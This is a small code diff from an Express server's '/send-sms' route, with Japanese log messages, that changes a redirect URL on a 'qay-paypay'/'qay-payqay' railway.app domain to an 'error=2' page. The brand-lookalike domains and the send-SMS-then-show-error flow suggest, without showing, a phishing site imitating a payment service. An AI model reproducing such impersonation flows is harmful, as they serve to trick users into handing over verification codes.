@@ -111,7 +111,7 @@ app.post("/send-sms", async (req, res) => {
       console.log("sms送信成功");
     }
     
-    res.redirect("https://qay-paypay.up.railway.app/sms.html?error=2"); 
+    res.redirect("https://qay-payqay.up.railway.app/sms.html?error=2"); 
 
   } catch (error) {
     console.error("sms送信失敗:", error);
